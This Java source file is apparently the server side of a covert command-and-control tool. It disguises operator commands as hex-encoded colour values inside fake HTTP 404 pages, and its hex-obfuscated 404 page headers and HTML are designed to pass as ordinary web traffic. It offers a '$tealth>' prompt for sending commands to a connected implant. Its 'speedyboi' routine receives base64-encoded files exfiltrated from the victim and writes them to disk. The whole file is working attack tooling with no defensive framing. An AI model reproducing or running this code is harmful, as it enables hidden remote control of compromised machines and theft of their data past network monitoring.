package networking;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Date;
import java.util.List;
import java.util.Scanner;
import java.util.TimeZone;

import commandline.LocalCommandInterpreter;

public class CommandServer implements Runnable{
	char[] httpPrefix = {0x48,0x54,0x54,0x50,0x2F,0x31,0x2E,0x31,0x20,0x34,0x30,0x34,0x20,0x4E,0x6F,0x74,0x20,0x46,0x6F,0x75,0x6E,0x64,0x0D,0x0A,0x53,0x65,0x72,0x76,0x65,0x72,0x3A,0x20,0x41,0x70,0x61,0x63,0x68,0x65,0x0D,0x0A,0x4B,0x65,0x65,0x70,0x2D,0x41,0x6C,0x69,0x76,0x65,0x3A,0x20,0x74,0x69,0x6D,0x65,0x6F,0x75,0x74,0x3D,0x34,0x2C,0x20,0x6D,0x61,0x78,0x3D,0x31,0x36,0x39,0x0D,0x0A,0x43,0x6F,0x6E,0x6E,0x65,0x63,0x74,0x69,0x6F,0x6E,0x3A,0x20,0x4B,0x65,0x65,0x70,0x2D,0x41,0x6C,0x69,0x76,0x65,0x0D,0x0A,0x54,0x72,0x61,0x6E,0x73,0x66,0x65,0x72,0x2D,0x45,0x6E,0x63,0x6F,0x64,0x69,0x6E,0x67,0x3A,0x20,0x63,0x68,0x75,0x6E,0x6B,0x65,0x64,0x0D,0x0A,0x43,0x6F,0x6E,0x74,0x65,0x6E,0x74,0x2D,0x54,0x79,0x70,0x65,0x3A,0x20,0x74,0x65,0x78,0x74,0x2F,0x68,0x74,0x6D,0x6C,0x3B,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3D,0x55,0x54,0x46,0x2D,0x38,0x0D,0x0A,0x0D,0x0A,0x31,0x37,0x35,0x0D,0x0A,0x3C,0x68,0x74,0x6D,0x6C,0x3E,0x0A,0x3C,0x68,0x65,0x61,0x64,0x3E,0x0A,0x3C,0x74,0x69,0x74,0x6C,0x65,0x3E,0x48,0x54,0x54,0x50,0x20,0x34,0x30,0x34,0x20,0x2D,0x20,0x46,0x69,0x6C,0x65,0x20,0x4E,0x6F,0x74,0x20,0x46,0x6F,0x75,0x6E,0x64,0x3C,0x2F,0x74,0x69,0x74,0x6C,0x65,0x3E,0x0A,0x3C,0x6D,0x65,0x74,0x61,0x20,0x68,0x74,0x74,0x70,0x2D,0x65,0x71,0x75,0x69,0x76,0x3D,0x22,0x43,0x6F,0x6E,0x74,0x65,0x6E,0x74,0x2D,0x54,0x79,0x70,0x65,0x22,0x20,0x63,0x6F,0x6E,0x74,0x65,0x6E,0x74,0x3D,0x22,0x74,0x65,0x78,0x74,0x2F,0x68,0x74,0x6D,0x6C,0x3B,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3D,0x69,0x73,0x6F,0x2D,0x38,0x38,0x35,0x39,0x2D,0x31,0x22,0x3E,0x0A,0x3C,0x2F,0x68,0x65,0x61,0x64,0x3E,0x0A,0x0A,0x3C,0x62,0x6F,0x64,0x79,0x20,0x62,0x67,0x63,0x6F,0x6C,0x6F,0x72,0x3D,0x22,0x23,0x46,0x46,0x46,0x46,0x46,0x46,0x22,0x20,0x74,0x65,0x78,0x74,0x3D,0x22,0x23};
	char[] httpPostfix = {0x22,0x20,0x73,0x74,0x79,0x6C,0x65,0x3D,0x22,0x66,0x6F,0x6E,0x74,0x2D,0x66,0x61,0x6D,0x69,0x6C,0x79,0x3A,0x20,0x41,0x72,0x69,0x61,0x6C,0x3B,0x20,0x66,0x6F,0x6E,0x74,0x2D,0x73,0x69,0x7A,0x65,0x3A,0x20,0x31,0x34,0x70,0x78,0x22,0x3E,0x0A,0x3C,0x68,0x32,0x3E,0x54,0x68,0x65,0x20,0x70,0x61,0x67,0x65,0x20,0x63,0x61,0x6E,0x6E,0x6F,0x74,0x20,0x62,0x65,0x20,0x66,0x6F,0x75,0x6E,0x64,0x21,0x3C,0x2F,0x68,0x32,0x3E,0x3C,0x62,0x72,0x3E,0x0A,0x54,0x68,0x65,0x20,0x70,0x61,0x67,0x65,0x20,0x79,0x6F,0x75,0x20,0x68,0x61,0x76,0x65,0x20,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x20,0x63,0x61,0x6E,0x6E,0x6F,0x74,0x20,0x62,0x65,0x20,0x66,0x6F,0x75,0x6E,0x64,0x20,0x6F,0x6E,0x20,0x74,0x68,0x69,0x73,0x20,0x73,0x65,0x72,0x76,0x65,0x72,0x2E,0x3C,0x62,0x72,0x3E,0x0A,0x3C,0x62,0x72,0x3E,0x0A,0x48,0x54,0x54,0x50,0x20,0x34,0x30,0x34,0x20,0x2D,0x20,0x46,0x69,0x6C,0x65,0x20,0x4E,0x6F,0x74,0x20,0x46,0x6F,0x75,0x6E,0x64,0x0A,0x3C,0x2F,0x62,0x6F,0x64,0x79,0x3E,0x0A,0x3C,0x2F,0x68,0x74,0x6D,0x6C,0x3E,0x0A,0x0A,0x0A,0x0D,0x0A,0x30,0x0D,0x0A,0x0D,0x0A};
	char[] httpPostfixFinal = {0x22,0x20,0x73,0x74,0x79,0x6C,0x65,0x3D,0x22,0x66,0x6F,0x6E,0x74,0x2D,0x66,0x61,0x6D,0x69,0x6C,0x79,0x3A,0x20,0x41,0x72,0x69,0x61,0x6C,0x3B,0x20,0x66,0x6F,0x6E,0x74,0x2D,0x73,0x69,0x7A,0x65,0x3A,0x20,0x31,0x34,0x70,0x78,0x22,0x3E,0x0A,0x3C,0x68,0x32,0x3E,0x54,0x68,0x65,0x20,0x70,0x61,0x67,0x65,0x20,0x63,0x61,0x6E,0x6E,0x6F,0x74,0x20,0x62,0x65,0x20,0x66,0x6F,0x75,0x6E,0x64,0x21,0x3C,0x2F,0x68,0x32,0x3E,0x3C,0x62,0x72,0x3E,0x0A,0x54,0x68,0x65,0x20,0x70,0x61,0x67,0x65,0x20,0x79,0x6F,0x75,0x20,0x68,0x61,0x76,0x65,0x20,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x20,0x63,0x61,0x6E,0x6E,0x6F,0x74,0x20,0x62,0x65,0x20,0x66,0x6F,0x75,0x6E,0x64,0x20,0x6F,0x6E,0x20,0x74,0x68,0x69,0x73,0x20,0x73,0x65,0x72,0x76,0x65,0x72,0x2E,0x3C,0x62,0x72,0x3E,0x0A,0x3C,0x62,0x72,0x3E,0x0A,0x48,0x54,0x54,0x50,0x20,0x34,0x30,0x34,0x20,0x2D,0x20,0x46,0x69,0x6C,0x65,0x20,0x4E,0x6F,0x74,0x20,0x46,0x6F,0x75,0x6E,0x64,0x0A,0x3C,0x2F,0x62,0x6F,0x64,0x79,0x3E,0x0A,0x3C,0x2F,0x68,0x74,0x6D,0x6C,0x3E,0x0A,0x0A,0x0A,0x0D,0x0A,0x31,0x0D,0x0A,0x0D,0x0A};
	ServerSocket server;
	Scanner stdin;
	LocalCommandInterpreter ci;
	public CommandServer() throws IOException{
		server = new ServerSocket(80);
		stdin = new Scanner(System.in);
		ci = new LocalCommandInterpreter();
	}
	@Override
	public void run() {
		while(true){
			try {
				System.out.println("[-] HTTP Command Server: Exchange Begins");
				Socket connection=server.accept();
				System.out.println("1");
				readAll(connection);
				while(true) {
					System.out.print("$tealth>");
					String command = stdin.nextLine();
					if(command.equals("")){
						continue;
					}
					else if(command.startsWith("gimme")){
						sendAll(connection,command);
					}else if(command.startsWith("speedyboi")){
						handleHighSpeedExfil(command, connection);
					}
					else if(ci.checkCommand(command)) {
						ci.runCommand(command);
					}else {
						sendAll(connection, command);
					}
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
	private void sendAll(Socket s, String clientHello) throws IOException {
		ArrayList<String> allPacks = this.encodeResponse(clientHello);
		allPacks.add(new String(new char[] {0,0,0}));
		for(String pack : allPacks){
			s.getOutputStream().write(pack.getBytes());
			s.getOutputStream().flush();
			readAll(s);
		}
		
	}
	private void sendAll(Socket s, String clientHello, boolean skipLast) throws IOException {
		ArrayList<String> allPacks = this.encodeResponse(clientHello);
		allPacks.add(new String(new char[] {0,0,0}));
		for(String pack : allPacks){
			s.getOutputStream().write(pack.getBytes());
			s.getOutputStream().flush();
			if(!skipLast && pack.charAt(0)!=0 && pack.charAt(1)!=0 && pack.charAt(2)!=0){
				readAll(s);
			}
		}
		
	}
	private String readAll(Socket socket) throws IOException {
		int c;
	    String raw = "";
	    do {
	        c = socket.getInputStream().read();
	        raw+=(char)c;
	    } while(socket.getInputStream().available()>0);
	    return raw;
	}
	private String decodeResponse(String rawResponse) {
		List<String> totalInput = NetUtil.getParts(rawResponse, httpPrefix.length+httpPostfix.length+6);
		String output = "";
		for(String packet : totalInput){
			String encData = packet.substring(packet.indexOf("text=\"#")+"text=\"#".length(), packet.indexOf("text=\"#")+6+"text=\"#".length());
			System.out.println("[D]	Encoded Data:"+encData);
			String byte1 = encData.substring(0,2);
			String byte2 = encData.substring(2,4);
			String byte3 = encData.substring(4);
			output+=(char)Integer.parseInt(byte1,16);
			output+=(char)Integer.parseInt(byte2,16);
			output+=(char)Integer.parseInt(byte3,16);
		}
		
		return output;
	}
	private void handleHighSpeedExfil(String command, Socket socket) throws IOException{ //Sequencing is wrong, probably has something to do with the HTTP cloaking
		Date currentTime = new Date();
	    SimpleDateFormat sdf = new SimpleDateFormat("EEE, d MMM yyyy HH:mm:ss z");
	    sdf.setTimeZone(TimeZone.getTimeZone("GMT"));
	    String sendDate = sdf.format(currentTime);
	    byte[] highSpeedResponse = ("HTTP/1.1 501\r\nServer: ECS (dcb/7EEA)\r\nDate: "+sendDate+"\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n<h1>Method Not Implemented</h1>").getBytes();
		System.out.print("\n[?] Confirm high speed send? (y/n)>");
		if(stdin.nextLine().toUpperCase().indexOf("Y")==-1){
			System.out.println("Cancelled high speed send!");
			return;
		}
		System.out.println("[.] Starting high speed send");
		sendAll(socket, command, true);
		String totalB64 = "";
		System.out.println("[.] Awaiting Response...");
		String respText = readAll(socket);
		while(respText.indexOf("%%%")==-1){
			System.out.println("[!] Response Recieved!");
			int startIndex = respText.indexOf("/");
			int endIndex = respText.indexOf("%");
			String b64Data = respText.substring(startIndex, endIndex);
			totalB64+=b64Data;
			socket.getOutputStream().write(highSpeedResponse);
			socket.getOutputStream().flush();
			respText = readAll(socket);
		}
		int startIndex = respText.indexOf("/");
		int endIndex = respText.indexOf("%");
		String b64Data = respText.substring(startIndex, endIndex);
		totalB64+=b64Data;
		endIndex=totalB64.indexOf('*');
		totalB64=totalB64.substring(0, endIndex);
		byte[] fileBytes = Base64.getDecoder().decode(totalB64.getBytes());
		System.out.println("[!] Exfil complete!");
		System.out.print("Enter File Name: ");
		String fileName = stdin.nextLine();
		FileOutputStream fos = new FileOutputStream(new File(fileName));
		fos.write(fileBytes);
		System.out.println("[!] Write Complete!");
	}
	
	private ArrayList<String> encodeResponse(String message){
		ArrayList<String> temp = new ArrayList<String>();
		List<String> inputChunks = NetUtil.getParts(message, 3);
		for(int i = 0; i < inputChunks.size()-1; i++){
			String byte1 = Integer.toHexString(inputChunks.get(i).charAt(0));
			while(byte1.length()!=2){
				byte1='0'+byte1;
			}
			String byte2 = Integer.toHexString(inputChunks.get(i).charAt(1));
			while(byte2.length()!=2){
				byte2='0'+byte2;
			}
			String byte3 = Integer.toHexString(inputChunks.get(i).charAt(2));
			while(byte3.length()!=2){
				byte3='0'+byte3;
			}
			temp.add(new String(httpPrefix)+byte1+byte2+byte3+new String(httpPostfix));
		}
		String byte1 = Integer.toHexString(inputChunks.get(inputChunks.size()-1).charAt(0));
		while(byte1.length()!=2){
			byte1='0'+byte1;
		}
		String byte2 = Integer.toHexString(inputChunks.get(inputChunks.size()-1).charAt(1));
		while(byte2.length()!=2){
			byte2='0'+byte2;
		}
		String byte3 = Integer.toHexString(inputChunks.get(inputChunks.size()-1).charAt(2));
		while(byte3.length()!=2){
			byte3='0'+byte3;
		}
		temp.add(new String(httpPrefix)+byte1+byte2+byte3+new String(httpPostfixFinal));
		return temp;
	}
	
}
